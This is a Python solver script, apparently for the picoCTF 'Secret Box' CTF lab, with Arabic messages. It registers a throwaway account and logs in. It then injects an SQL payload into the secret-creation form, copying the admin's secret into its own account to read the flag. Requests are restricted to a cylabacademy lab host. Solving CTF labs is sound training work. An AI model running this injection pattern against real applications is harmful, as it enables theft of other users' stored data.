"""Source-guided solver for the authorized picoCTF Secret Box lab."""
from __future__ import annotations

import http.cookiejar
import re
import secrets
import urllib.error
import urllib.parse
import urllib.request
from urllib.parse import urlsplit, urlunsplit

ADMIN_ID = "e2a66f7d-2ce6-4861-b4aa-be8e069601cb"
FLAG_RE = re.compile(r"(?:picoCTF|academy|flag|CTF)\{[^{}\r\n]{2,200}\}", re.I)


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def parse_target(challenge_text: str) -> str | None:
    normalized = re.sub(r"(https?)\\:", r"\1:", challenge_text, flags=re.I)
    m = re.search(r"https?://[a-z0-9.-]+\.cylabacademy\.(?:net|org)(?::\d{1,5})?(?:/[^\s<>\]\"']*)?", normalized, re.I)
    if not m:
        return None
    url = m.group(0).rstrip(".,)")
    u = urlsplit(url)
    try:
        port = u.port
    except ValueError:
        return None
    if u.username or u.password or (port is not None and not 1 <= port <= 65535):
        return None
    return urlunsplit((u.scheme.lower(), u.netloc, "/", "", ""))


def solve(challenge_text: str, timeout: float = 8.0) -> dict:
    target = parse_target(challenge_text)
    if not target:
        return {"ok": False, "success": False, "error": "لم أجد رابط مثيل Secret Box ضمن نطاق Cylab Academy."}
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), _NoRedirect())
    origin = urlsplit(target)
    steps: list[dict] = []

    def request(method: str, path: str, fields: dict | None = None):
        url = urllib.parse.urljoin(target, path)
        u = urlsplit(url)
        if (u.scheme, u.hostname, u.port) != (origin.scheme, origin.hostname, origin.port):
            raise ValueError("تم إيقاف طلب خارج أصل المثيل المحدد.")
        data = urllib.parse.urlencode(fields).encode() if fields is not None else None
        req = urllib.request.Request(url, data=data, method=method,
              headers={"User-Agent": "CTF-Falcon-SecretBox/2.33.0 (authorized CTF)",
                       "Accept": "text/html,*/*"})
        try:
            response = opener.open(req, timeout=timeout)
        except urllib.error.HTTPError as e:
            response = e
        body = response.read(2 * 1024 * 1024 + 1)
        if len(body) > 2 * 1024 * 1024:
            raise ValueError("استجابة المثيل أكبر من الحد المسموح.")
        text = body.decode("utf-8", "replace")
        location = response.headers.get("Location")
        status = response.code
        response.close()
        steps.append({"method": method, "path": path, "status": status})
        return status, text, location

    try:
        status, _, _ = request("GET", "/")
        if status != 200:
            raise RuntimeError(f"الصفحة الرئيسية أعادت HTTP {status}.")
        username = "falcon_" + secrets.token_hex(6)
        password = secrets.token_urlsafe(18)
        status, body, _ = request("GET", "/signup")
        if status != 200 or not re.search(r'name=[\"\']username[\"\']', body, re.I) or not re.search(r'name=[\"\']password[\"\']', body, re.I):
            raise RuntimeError("نموذج التسجيل لا يطابق حقول المصدر المرفق؛ أوقف صقر الإرسال.")
        status, body, _ = request("POST", "/signup", {"username": username, "password": password})
        if status != 200 or "Create User Successful" not in body:
            raise RuntimeError("لم يؤكد المثيل إنشاء الحساب التدريبي.")
        status, body, _ = request("POST", "/login", {"username": username, "password": password})
        if status not in (302, 303) or not any(c.name == "auth_token" for c in jar):
            raise RuntimeError("تعذر تسجيل الدخول أو لم يصدر المثيل كوكي الجلسة المتوقعة.")
        status, body, _ = request("GET", "/secrets/create")
        if status != 200 or not re.search(r'name=[\"\']content[\"\']', body, re.I):
            raise RuntimeError("صفحة إنشاء السر لا تطابق المصدر المرفق.")
        payload = ("x'), ((SELECT user_id FROM tokens WHERE id='" +
                   next(c.value for c in jar if c.name == "auth_token") +
                   "'), (SELECT content FROM secrets WHERE owner_id='" + ADMIN_ID + "' LIMIT 1))--")
        status, _, _ = request("POST", "/secrets/create", {"content": payload})
        if status not in (302, 303):
            raise RuntimeError(f"أعاد مسار إنشاء السر HTTP {status}.")
        status, body, _ = request("GET", "/")
        if status != 200:
            raise RuntimeError(f"تعذر قراءة أسرار الحساب التدريبي (HTTP {status}).")
        flag = next(iter(FLAG_RE.findall(body)), None)
        return {"ok": True, "success": bool(flag), "flag": flag, "target": target,
                "steps": steps, "created_test_account": True,
                "explanation_ar": ["قرأ صقر مسارات التطبيق من المصدر المرفق.",
                    "أنشأ حسابًا تدريبيًا فريدًا، ثم استخدم إدخال SQL غير الآمن في مسار إنشاء السر لنسخ سر المشرف إلى حساب الطالب.",
                    "استخرج العلم من صفحة أسرار الحساب التجريبي." if flag else "اكتمل مسار النسخ، لكن لم يظهر نص علم معروف في الاستجابة."],
                "warnings": [] if flag else ["لم يظهر نمط علم في الصفحة؛ تحقق من أن المثيل الحي يعمل وأن بياناته مطابقة للتحدي."]}
    except Exception as e:
        return {"ok": False, "success": False, "target": target, "steps": steps,
                "error": str(e)[:300], "warnings": ["لم تُعرض بيانات الجلسة أو كلمة مرور الحساب المؤقت في النتيجة."]}
